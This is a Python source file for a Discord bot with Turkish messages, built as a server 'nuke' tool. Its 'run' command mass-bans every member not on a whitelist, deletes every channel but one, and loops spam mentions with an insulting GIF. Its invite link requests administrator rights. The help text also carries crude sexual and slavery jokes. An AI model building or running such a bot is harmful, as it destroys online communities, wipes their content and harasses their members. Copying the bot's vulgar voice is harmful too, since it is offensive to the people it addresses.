from discord import *
from discord.ext import commands

import discord
import asyncio
import datetime
import locale
import random

intents = discord.Intents().all()
intents.message_content = True
intents.typing = False
intents.presences = False
locale.setlocale(locale.LC_TIME, "tr_TR") 

bot = commands.Bot(command_prefix='?', intents=intents, help_command=None)

#Local variables
loop = False
token = "bot-token"
owner_id = int("your-user-id")
colors = [0x1abc9c, 0x11806a, 0x2ecc71, 0x1f8b4c, 0x3498db, 0x206694, 0x9b59b6, 0x71368a, 0xe91e63, 0xe91e63, 0xad1457, 0xf1c40f, 0xc27c0e, 0xe67e22, 0xa84300, 0xe74c3c, 0x992d22, 0x95a5a6, 0x607d8b, 0x979c9f, 0x546e7a, 0x7289da]

# -------------------------------------------------------------------------

# Definitions

def filter():
    with open("data\\whitelist.txt", "r") as f:
        users = f.readlines()
        users_filtered=[]

        for u in users:
            users_filtered.append(u.replace("\n",""))
                        
    return users_filtered

async def checkAdmin(ctx_id, ctx):

    async def errormessage(ctx):
        m=await ctx.reply("Sadece yapımcılarım bu komudu kullanabilir!")
        await asyncio.sleep(2)
        await m.delete()
        await ctx.message.delete()

    owners=open("data\\whitelist.txt","r").readlines()
    one_time = True
    own=[]

    for owner in owners:
        own.append(str(owner).replace("\n",""))

    if str(ctx_id) not in own:
        await errormessage(ctx)
        return False

    elif str(ctx_id) in own:
        return True

def toDo():

    try:
        with open("data\\todo.txt","r", encoding="utf-8") as f:
            text = f.readlines()

            if len(text) == 0:
                return None
        

            now = datetime.datetime.now()
            date = now.strftime("%d %B, %Y")

            t = "Tarih: " + str(date) + "\n\n"

            for line in text:

                t += line.replace("\n", "") + "\n"

            return t

    except Exception as e:

        print(e)

        try:
            open("data\\todo.txt","r")
            
        except:
            open("data\\todo.txt","w")
            return None

def checkToDo():
    if toDo() == None:
        print("Yapılacaklar listesi boş")
    else:
        print(toDo())

# -------------------------------------------------------------------------

@bot.event
async def on_ready():
    print("Logged in!" + "\n")
    checkToDo()

@bot.command(name="help", description="Bu ekranı gösterir.")
async def help(ctx):

    global colors

    embed=discord.Embed(title="Beni sunucuna davet et", url="https://discord.com/oauth2/authorize?client_id=1104147209114636398&scope=bot&permissions=8", color=random.choice(colors))
    embed.set_author(name="Komutlar")
    embed.set_thumbnail(url=str(bot.user.display_avatar))
    

    for command in bot.commands:
        if str(command) == "clear" or command.name == "quit":
            pass
        else:
            embed.add_field(name=str(command), value=command.description, inline=False)

    text = "Ben, Emirin Büllüğü.\nYusuf Adlı kişinin tarlasından kaçıp Zgn tarafından bulunup kodlanan bir Discord Bot Yazılımıyım.\nBoyum 5 santimetredir.\nEski mesleğim köleliktir.\nVarlık sebebim beyaz şeyler fışkırtmak."

    embed.add_field(name="\n**Hakkımda**", value=text, inline=False)
    embed.set_footer(text="--Emirin Büllüğü")
    
    await ctx.send(embed=embed)
    

@bot.command(description="Sunucu patlatma komudu.")
async def run(ctx):

    one_time = True
    mentions = ""

    access = await checkAdmin(ctx.author.id, ctx)
    if not access:
        return

    global loop
    loop = True

    await ctx.message.delete()

    # -------------------------------------------------------------------------

    #Sends private DM To ctx author

    try:

        msg = await ctx.author.send('Emin misin?')
        await msg.add_reaction("✅")

        try:

            def check(reaction, user):
                return user == ctx.author and str(reaction.emoji) == '✅'
            await bot.wait_for('reaction_add', timeout=10.0, check=check)

        except:

            await msg.delete()
            m=await ctx.author.send("Doğrulama süresi sona erdi.")
            await asyncio.sleep(2)
            await m.delete()
            return
    
        await msg.delete()

    except:
        await asyncio.sleep(1)

    # -------------------------------------------------------------------------
    
    for user in ctx.guild.members:
        try:
            try:         
                users = filter()

            except Exception as e:

                print(e)
            
            if str(user.id) not in users and user.id != bot.user.id:
                mentions += "<@{}> ".format(str(user.id))
                await user.ban(reason="None")
        
        except Exception as e:

            print(e)
            print("Couldn't ban", user.name)

    while loop:

        for c in ctx.guild.channels: # iterating through each guild channel
            if c.name == "hehehe":
                channel = c

                if one_time:
                    await channel.purge(limit=None)
                    one_time = False

            elif c.name != "hehehe":
                await c.delete()
        

        try:
            await channel.send(mentions + "https://cdn.discordapp.com/attachments/1104165427011125258/1104165588294709259/you-are-idiot.gif")
        
        except:
            channel = await ctx.guild.create_text_channel('hehehe')

        await asyncio.sleep(0.5)

@bot.command(description="Botu kimin kullanabileceğini gösterir.")
async def whitelist(ctx):
    
    try:
        with open("data\\whitelist.txt", "r") as f:
            users = f.readlines()
            users_to_id = ""

            for user in users:
                if str(user).replace("\n","") == str(owner_id):
                    users_to_id += "<@" + str(user).replace("\n","") + "> - Bot Sahibi\n"

                else:
                    users_to_id += "<@" + str(user).replace("\n","") + ">\n"

            
            
            embed=discord.Embed(title="\n", color=random.choice(colors))
            embed.set_author(name="Whitelist")
            embed.set_thumbnail(url=str(bot.user.display_avatar))
            embed.add_field(name="\n", value=users_to_id, inline=False)
            embed.set_footer(text="--Emirin Büllüğü")

            await ctx.send(embed=embed)

    except Exception as e:
        print(e)

        try:
            open("data\\whitelist.txt","r")

        except:
            with open("data\\whitelist.txt", "w") as f:
                pass

            await ctx.send("Henüz veritabanımda hiç bir kullanıcı yok.")

@bot.command(description="Kullanıma açık değil.")
@commands.is_owner()
async def clear(ctx):
        
        async for message in ctx.author.history(limit=None):
            if message.author == bot.user: #client.user or bot.user according to what you have named it
                await message.delete()

@bot.command(description="Sunucu patlatma işlemini durdurur.")
async def stop(ctx):

    access = await checkAdmin(ctx.author.id, ctx)

    if not access:
        return

    global loop
    if not loop:
        x=await ctx.reply("Mesaj döngüsü şuan aktif değil, durdurulmaya gerek yok.")
        await asyncio.sleep(2)
        await x.delete()
        await ctx.message.delete()
        return
    
    loop = False

    try:
        warn=await ctx.author.send("Döngü durduruldu.")
        await asyncio.sleep(0.7)
        await ctx.message.delete()
        msg=await ctx.author.send("Kanalı temizlememi ister misin?")
        await msg.add_reaction("✅")

        try:
            def check(reaction, user):
                return user == ctx.author and str(reaction.emoji) == '✅'
            await bot.wait_for('reaction_add', timeout=10.0, check=check)

        except:
            await msg.delete()
            await ctx.message.delete()
            await warn.delete()
            m=await ctx.author.send("Doğrulama süresi sona erdi.")
            await asyncio.sleep(2)
            await m.delete()
            return

        for c in ctx.guild.channels: # iterating through each guild channel
            if c.name == "hehehe":
                await c.purge(limit=None)
                m=await ctx.author.send('"{}" adlı kanal temizlendi.'.format(c.name))
                await asyncio.sleep(2)
                await m.delete()
                await msg.delete()
                await warn.delete()
                return
        
        mm=await ctx.author.send("Kanal bulunamadı, döngü durduruldu.")
        await mm.delete()
        await msg.delete()
        await warn.delete()

    except:
        await ctx.channel.purge(limit=None)

@bot.command(description="Botu kapatır. (Sadece botun sahibi kullanabilir)", aliases=["q","qu","f4"])
@commands.is_owner()
async def quit(ctx):

    await ctx.message.delete()
    await bot.close()

bot.run(token)  # Where 'TOKEN' is your bot token
